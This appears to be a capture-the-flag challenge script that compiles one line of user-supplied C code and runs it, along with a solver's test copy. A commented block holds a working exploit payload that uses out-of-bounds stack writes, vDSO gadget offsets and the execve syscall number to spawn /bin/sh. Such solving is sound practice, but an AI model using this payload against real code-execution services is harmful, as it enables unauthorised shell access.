# #!/usr/local/bin/python3 -u
# import os
# import os.path
# import subprocess
# import tempfile

# template = """
# int main() {
#     %s
# }
# """

# banned = "{}()#%?"

# print("Input your code (1 line)")
# code = input("> ")

# for c in banned:
#     if c in code:
#         print("Now that would make things too easy wouldn't it...")
#         exit(1)

# with tempfile.TemporaryDirectory() as td:
#     src_path = os.path.join(td, "source.c")
#     compiled_path = os.path.join(td, "compiled")
#     with open(src_path, "w") as file:
#         file.write(template % code)

#     returncode = subprocess.call(["gcc", "-Werror", "-Wall", "-O0", "-o",
#                                  compiled_path, src_path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

#     if returncode != 0:
#         print("Oops, there were some compilation errors!")
#         exit(1)

#     print("Okay hopefully it does something now!")
#     os.system(f"cp {compiled_path} /home/user")
#     subprocess.call([compiled_path])

#!/usr/local/bin/python3 -u
import os
import os.path
import subprocess
import tempfile

template = """
int _start() {
    %s
}
"""

banned = "{}()#%?"

print("Input your code (1 line)")
# code = """
# long x[1];
# x[0] = 0x1337;
# long vdso_base = x[0xf];
# long stack = x[0x35]-1;
# x[0x3f] = 0x68732f6e69622f;
# x[0x40] = 0;
# x[4] = vdso_base +0xb4e;
# x[5] = stack;
# x[6] = 0;
# x[7] = vdso_base +0x8c2;
# return x[0]-x[0]+0x3b;
# """
# long x[1]; x[0] = 0x1337; long vdso_base = x[0xf], stack = x[0x35]-1; x[0x3f] = 0x68732f6e69622f; x[0x40] = 0; x[4] = vdso_base + 0xb4e; x[5] = stack; x[6] = 0; x[7] = vdso_base + 0x8c2; return x[0]-x[0]+0x3b;

code = input()


def fail():
    print("Now that would make things too easy wouldn't it...")
    exit(1)


# for c in banned:
#     if c in code:
#         fail()

# if "goto" in code:
#     fail()

with tempfile.TemporaryDirectory() as td:
    src_path = os.path.join(td, "source.c")
    compiled_path = os.path.join(td, "compiled")
    with open(src_path, "w") as file:
        file.write(template % code)

    # bye bye libc and ld, hope you didnt plan on using them
    argv = ["gcc", "-g", "-static", "-ffreestanding", "-nostdlib",
            "-Werror", "-Wall", "-o", compiled_path, src_path]
    returncode = subprocess.call(
        argv)

    if returncode != 0:
        print("Oops, there were some compilation errors!")
        exit(1)

    print("Okay hopefully it does something now!")
    os.system(f"cp {compiled_path} ./hehe")
    subprocess.call([compiled_path])
